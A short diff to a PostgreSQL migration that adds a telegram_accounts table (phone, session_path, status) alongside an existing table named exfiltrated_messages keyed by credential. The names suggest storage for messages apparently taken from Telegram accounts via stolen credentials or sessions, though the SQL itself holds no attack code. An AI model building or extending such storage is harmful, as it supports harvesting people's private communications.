@@ -37,3 +37,17 @@ CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted ON exfiltrated_messages(i
 -- Unique constraint to prevent duplicate messages per credential
 ALTER TABLE exfiltrated_messages DROP CONSTRAINT IF EXISTS unique_msg_per_credential;
 ALTER TABLE exfiltrated_messages ADD CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id);
+
+-- Table: telegram_accounts
+CREATE TABLE IF NOT EXISTS telegram_accounts (
+    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    phone TEXT NOT NULL UNIQUE,
+    session_path TEXT NOT NULL,
+    status TEXT CHECK (status IN ('active', 'inactive')) DEFAULT 'active',
+    created_at TIMESTAMPTZ DEFAULT NOW(),
+    updated_at TIMESTAMPTZ DEFAULT NOW()
+);
+
+-- Index for phone
+CREATE INDEX IF NOT EXISTS idx_accounts_phone ON telegram_accounts(phone);
+CREATE INDEX IF NOT EXISTS idx_accounts_status ON telegram_accounts(status);
